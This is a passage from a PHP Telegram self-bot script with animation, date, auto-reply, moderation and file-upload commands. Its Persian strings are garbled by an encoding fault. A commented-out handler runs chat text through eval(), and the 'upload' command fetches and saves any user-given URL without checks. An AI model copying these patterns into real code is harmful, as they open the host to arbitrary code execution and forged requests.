                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐___________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐__________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐____๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐___๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐__๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โุงูฺฏุดุช ุดุฏโ']);
                    }

                    if ($text == 'ู?ู' or $text == 'ุนุดูู?') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโโโโโโโโ 
โโโโโโโโโโโ 
โโโโโโโโโโโ 
โโโโโโโโ 
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโโโโโโโโ 
โโโโโโโโโโโ 
โโโโโโโโโโโ 
โโโโโโโโ 
โโโโโโโ 
โโโโโ 
โโโโ 
โโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโ(โ)โโโโโโ 
โโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโ 
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โโโโโโโโโโโ 
โโโโโโโโโโโ 
โโโโโโโโโโโ 
โโโโโโโโ 
โโโโโโโ 
โโโโโ 
โโโโ 
โโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโ(โ)โโโโโโ 
โโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโ 
โโโโโโโโโโโโโโโโโโโโโ
"]);
                    }
                    if (preg_match("/^\/[Tt][Aa][Ss]\s(\d)/", $text, $rr)) {
                        @touch("tas.txt");
                        $count = $rr[1];
                        @file_put_contents("tas.txt", $rr[1]);
                        if ($count >= 7) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "Chizi zadi? dice bishtar az 6 ta nis", 'parse_mode' => 'MarkDown']);
                        } else {
                            $diceo = ['_' => 'inputMediaDice', 'emoticon' => '๐ฒ'];
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "๐ฆ๐ฒ๐ป๐ฑ๐ถ๐ป๐ด ๐๐ถ๐ฐ๐ฒ ๐ก๐๐บ๐ฏ๐ฒ๐ฟ [ $rr[1] ]", 'parse_mode' => 'markdown']);
                            yield $this->messages->sendMedia(['peer' => $peer, 'media' => $diceo, 'message' => "๐ฒ"]);
                        }
                    }
                    if (isset($update['message']['media']['_'])) {
                        if ($update['message']['media']['_'] == "messageMediaDice") {
                            if (is_numeric(file_get_contents("tas.txt"))) {
                                $valueo = $update['message']['media']['value'];
                                if (file_exists("tas.txt") and $valueo != file_get_contents("tas.txt")) {
                                    yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                    $diceo = ['_' => 'inputMediaDice', 'emoticon' => '๐ฒ'];
                                    yield $this->messages->sendMedia(['peer' => $peer, 'media' => $diceo, 'message' => "๐ฒ"]);
                                } else {
                                    unlink("tas.txt");
                                }
                            }
                        }
                    }
                    if ($text == 'time' or $text == 'ุณุงุนุช' or $text == 'ุชุง?ู') {
                        date_default_timezone_set('Asia/Tehran');
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => ';)']);
                        for ($i = 1; $i <= 5; $i++) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => date('H:i:s')]);
                            yield $this->sleep(1);
                        }
                    }

                    if ($text == 'ุชุงุฑ?ุฎ ุดูุณ?') {
                        $fasl = jdate('f');
                        $month_name = jdate('F');
                        $day_name = jdate('l');
                        $tarikh = jdate('y/n/j');
                        $hour = jdate('H:i:s - a');
                        $animal = jdate('q');
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ุงูุฑูุฒ  $day_name  |$tarikh|

ูุงู ูุงู๐: $month_name

ูุงู ูุตู โ๏ธ: $fasl

ุณุงุนุช โ๏ธ: $hour

ูุงู ุญ?ูุงู ุงูุณุงู : $animal
"]);
                    }

                    if ($text == 'ุชุงุฑ?ุฎ ู?ูุงุฏ?') {
                        date_default_timezone_set('UTC');
                        $rooz = date("l"); // ุฑูุฒ
                        $tarikh = date("Y/m/d"); // ุณุงู
                        $mah = date("F"); // ูุงู ูุงู
                        $hour = date('H:i:s - A'); // ุณุงุนุช
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "today  $rooz |$tarikh|

month name๐: $mah

timeโ๏ธ: $hour"]);
                    }


                    if (preg_match("/^[\/\#\!]?(setanswer) (.*)$/si", $text)) {
                        $ip = trim(str_replace("/setanswer ", "", $text));
                        $ip = explode("|", $ip . "|||||");
                        $txxt = trim($ip[0]);
                        $answeer = trim($ip[1]);
                        if (!isset($data['answering'][$txxt])) {
                            $data['answering'][$txxt] = $answeer;
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ษดแดแดก แดกแดสแด แดแดแดแดแด แดแด สแดแดส แดษด๊ฑแดกแดส สษช๊ฑแด๐ป"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "แดสษช๊ฑ แดกแดสแด แดสสแดแดแดส แดxษช๊ฑแด๊ฑ"]);
                        }
                    }
                    /*
                        if (preg_match("/^[\/\#\!]?(php) (.*)$/si", $text)) {
                            preg_match("/^[\/\#\!]?(php) (.*)$/si", $text, $a);


                            if (strpos($a[2], '$MadelineProto') === false and strpos($a[2], '$this') === false) {
                                $OutPut = eval("$a[2]");
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "`๐ป $OutPut`", 'parse_mode' => 'markdown']);
                            }
                        }*/

                    if (preg_match("/^[\/\#\!]?(screen) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(screen) (.*)$/si", $text, $m);

                        $mi = $m[2];
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ษขแดแดแดษชษดษข ๊ฑแดสแดแดษด๊ฑสแดแด ๊ฐสแดแด โ $m[2] โ แดกแดส ๊ฑษชแดแด", 'parseMarkDown_mode' => ""]);

                        $ound = "https://api.codebazan.ir/webshot/?text=1000&domain=" . $mi;
                        $inputMediaGifExternal = ['_' => 'inputMediaGifExternal', 'url' => $ound];
                        $Updates = $this->messages->sendMedia(['peer' => $peer, 'media' => $inputMediaGifExternal, 'reply_to_msg_id' => $msg_id, 'message' => "๊ฑแดสแดแดษด๊ฑสแดแด แดกแด๊ฑ แดสแดแดแดสแดแด ๊ฐสแดแด แดสแด แดแด๊ฑษชสแดแด ๊ฑษชแดแด ๐ธ"]);
                    }

                    if (preg_match("/^[\/\#\!]?(upload) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(upload) (.*)$/si", $text, $a);
                        $oldtime = time();
                        $link = $a[2];
                        $ch = curl_init($link);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                        curl_setopt($ch, CURLOPT_HEADER, TRUE);
                        curl_setopt($ch, CURLOPT_NOBODY, TRUE);
                        $data = curl_exec($ch);
                        $size1 = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
                        curl_close($ch);
                        $size = round($size1 / 1024 / 1024, 1);
                        if ($size <= 200.9) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '๐ต Please Wait...
๐ก FileSize : ' . $size . 'MB']);
                            $path = parse_url($link, PHP_URL_PATH);
                            $filename = basename($path);
                            copy($link, "files/$filename");
                            yield $this->messages->sendMedia([
                                'peer' => $peer,
                                'media' => [
                                    '_' => 'inputMediaUploadedDocument',
                                    'file' => "files/$filename",
                                    'attributes' => [['_' => 'documentAttributeFilename',
                                        'file_name' => "$filename"]]],
                                'message' => "๐ Name : $filename
๐  [Your File !]($link)
๐ก Size : " . $size . 'MB',
                                'parse_mode' => 'Markdown'
                            ]);
                            $t = time() - $oldtime;
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โ แดแดสแดแดแดแดแด ($t" . 's)']);
                            unlink("files/$filename");
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'โ ๏ธ ุฎุทุง : ุญุฌู ูุง?ู ุจ?ุดุชุฑ ุงุฒ 200 ูฺฏ ุงุณุช!']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text)) {
                        preg_match("/^[\/\#\!]?(delanswer) (.*)$/si", $text, $text);
                        $txxt = $text[2];
                        if (isset($data['answering'][$txxt])) {
                            unset($data['answering'][$txxt]);
                            yield $this->filePutContents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ ๐ป๐๐ ๐พ๐๐๐ ๐พ๐๐ ๐น๐๐๐๐๐๐ ๐ญ๐๐๐ ๐ป๐๐ ๐จ๐๐๐๐๐ ๐ณ๐๐๐!**", 'parse_mode' => 'markdown']);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ ๐ป๐๐๐ ๐พ๐๐๐ ๐ฐ๐ ๐ด๐๐๐๐๐๐ ๐ฐ๐ ๐ป๐๐ ๐จ๐๐๐๐๐ ๐ณ๐๐๐!**", 'parse_mode' => 'markdown']);
                        }
                    }
                    if ($text == '/id' or $text == 'id') {
                        if (isset($message['reply_to_msg_id'])) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '**ึ ๐๐๐๐ ๐ฐ๐ซ :** ' . $messag, 'parse_mode' => 'markdown']);
                            } else {
                                if ($type3 == 'user') {
                                    yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐๐๐๐ ๐ฐ๐ซ :** `$peer`", 'parse_mode' => 'markdown']);
                                }
                            }
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐ฎ๐๐๐๐ ๐ฐ๐ซ :** `$peer`", 'parse_mode' => 'markdown']);
                        }
                    }
                    if (isset($update['message']['reply_to']['reply_to_msg_id'])) {
                        if (preg_match("/^[\/\#\!]?(pin)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                yield $this->messages->updatePinnedMessage(['silent' => true, 'unpin' => false, 'pm_oneside' => false, 'peer' => $peer, 'id' => $gmsg,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐ท๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(block)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            yield $this->contacts->block(['id' => $messag]);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐ฉ๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                        }
                        if (preg_match("/^[\/\#\!]?(unblock)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            yield $this->contacts->unblock(['id' => $messag]);
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐ผ๐๐๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                        }
                        if (preg_match("/^[\/\#\!]?(setenemy)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (!in_array($messag, $data['enemies'])) {
                                $data['enemies'][] = $messag;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->block(['id' => $messag]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐ฐ๐ ๐ต๐๐ ๐ฌ๐๐๐๐๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐พ๐๐ ๐ฐ๐ ๐ฌ๐๐๐๐๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(delenemy)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (in_array($messag, $data['enemies'])) {
                                $k = array_search($messag, $data['enemies']);
                                unset($data['enemies'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->contacts->unblock(['id' => $messag]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐ซ๐๐๐๐๐๐ ๐ญ๐๐๐ ๐ฌ๐๐๐๐๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐พ๐๐๐'๐ ๐ฐ๐ ๐ฌ๐๐๐๐๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(silent)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to']['reply_to_msg_id'];
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $mute,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐๐ ๐บ๐๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(unsilent)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $unmute = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 9999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unmute,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐๐ ๐ผ๐๐๐๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(ban)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $ban = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $ban,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐๐ ๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(delall)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                yield $this->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ ๐จ๐๐** [๐ผ๐๐๐](mention:$messag) **๐ด๐๐๐๐๐๐๐ ๐ซ๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(unban)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $mee = yield $this->getFullInfo($messag);
                                $me = $mee['User'];
                                $unban = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unban,]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐๐๐ ๐๐๐๐๐๐๐๐๐๐๐๐ ๐๐๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(mute)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (!in_array($messag, $data['muted'])) {
                                $data['muted'][] = $messag;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐ฐ๐ ๐ต๐๐ ๐ด๐๐๐ ๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐พ๐๐ ๐ฐ๐ ๐ด๐๐๐๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(unmute)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (in_array($messag, $data['muted'])) {
                                $k = array_search($messag, $data['muted']);
                                unset($data['muted'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐ซ๐๐๐๐๐๐ ๐ญ๐๐๐ ๐ด๐๐๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**ึ** [๐ผ๐๐๐](mention:$messag) **๐พ๐๐๐'๐ ๐ฐ๐ ๐ด๐๐๐๐ณ๐๐๐!**", 'parse_mode' => 'Markdown']);
                            }
                        }


                    }

                    if (preg_match("/^[\/\#\!]?(answerlist)$/si", $text)) {
                        if (count($data['answering']) > 0) {
                            $txxxt = "**๐ณ๐๐๐ ๐ถ๐ ๐จ๐๐๐๐๐๐ :**";
                            $counter = 1;
                            foreach ($data['answering'] as $k => $ans) {
                                $txxxt .= "$counter: $k => $ans \n";
                                $counter++;
                            }
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**ึ ๐ป๐๐๐๐ ๐ฐ๐ ๐ต๐ ๐จ๐๐๐๐๐!**", 'parse_mode' => 'Markdown']);
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(funhelp)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
โฐโโ Pฬถaฬถwฬถnฬถ Self Fun Help โโโฎ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุขุฏู ูุถุง??</code>
ุขุฏู ูุถุง?? ูพ?ุฏุง ู?ฺฉู?๐ฝ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ููุดฺฉ </code>
ุจู ุณู?ูู ููุดฺฉ ูพุฑุช ู?ฺฉู?๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ูพูู</code>
ูพูู ุขุช?ุด ู?ุฒูู๐ฅ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุฎุฒูุฎ?ู</code>
ุจุงฺฉุงุฑุงุด ุนูุช ู?ุงุฏ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุฑูุญ</code>
ุฑูุญู ู?ุชุฑุณููุด๐ป
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุจุฑู ุฎููู</code>
ูพ?ฺููุฏู ฺฉุณ? ุฎ?ู? ุญุฑูู ุง?๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุดฺฉุณุช ุนุดู? </code>
ุนุงูุจุช ูุฑุงุฑ ุงุฒ ุฎููุณ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุนูุงุจ </code>
ุนูุงุจู ุดฺฉุงุฑุด ู?ฺฉูู๐ค
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุญููู</code>
ุฏุฑุญููู ุจุงุฒ ู?ฺฉู?๐คฃ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๏ธ ๐น๏ธ<code>ุขูพุฏ?ุช</code>
ุณุฑูุฑ ุขูพุฏ?ุช ู?ุดู๐ถ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุจฺฉุดุด</code>
ุฌูุง?ุชฺฉุงุฑ ฺฉุดุชู ู?ุดู๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุฎุง?ูุงู</code>
ุฎุง?ู ูุงูู ุณฺฏ ุจฺฏุงุฏ๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ูุณุฌุฏ </code>
ูพุณุฑู ู?ุฑู ูุณุฌุฏ๐ฟ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ฺฉูุณู</code>
ฺฉูุณู ุจูุด ุญููู ู?ฺฉููโ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุจุงุฑูู</code>
ุฑุนุฏ ู ุจุฑู ูุจุงุฑูู๐ง
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุดุจ ุฎูุด</code>
ู?ุฎุงุจ?๐ฅฑ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุจุฑู ุจุฎุงุจู</code>
ู?ุฑู ู ู?ุฎุงุจู๐ด
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุจุงุฏฺฉูฺฉ</code>
ุจุช ฺุงูู ุจุงุฏฺฉูฺฉ ูพุงุฑู ู?ฺฉู?๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ููุชุจุงู</code>
ุชููพู ู?ฺฉูู ุชู ุฏุฑูุงุฒู๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ู?ุด?ูฺฏ</code>
๐ฐphishing
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุบุฑูุด ฺฉู</code>
ุบุฑูุด ู?ฺฉูู๐
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ูุถุงููุฑุฏ</code>
ูู ู?ฺฏู ุง?ุฑุงู ูู?ู๐ฎ๐ท
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุจุฒู ูุฏุด</code>
ู?ุฒู?ู ูุฏุด๐งค
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุนุดูู?</code>
?ู ู?ู ู ?ู ููุจโค
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุดูุงุฑุด</code>
ุดูุงุฑุดุด ู?ุฒู?๐ซ
โคโคโคโคโคโคโคโฆโฆโฆโฆโฆโฆโฆ
๐น๏ธ<code>ุฑูุต</code>
ุฑูุต ูฺฉุนุจ ูุง ๐
